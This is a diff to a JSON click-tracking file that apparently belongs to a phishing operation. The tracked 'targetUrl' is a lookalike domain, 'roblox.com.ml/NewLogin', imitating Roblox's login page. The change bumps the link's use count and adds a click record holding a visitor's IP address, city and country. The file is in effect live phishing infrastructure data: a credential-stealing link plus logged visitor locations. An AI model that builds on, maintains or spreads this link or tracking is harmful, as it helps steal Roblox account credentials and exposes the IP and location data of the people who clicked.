@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 389,
+    "useCount": 390,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3224,6 +3224,14 @@
         "city": "Yangon",
         "flag": "🇲🇲",
         "countryCode": "MM"
+      },
+      {
+        "timestamp": 1777041821076,
+        "ip": "212.93.128.15",
+        "country": "Romania",
+        "city": "Olteniţa",
+        "flag": "🇷🇴",
+        "countryCode": "RO"
       }
     ]
   },
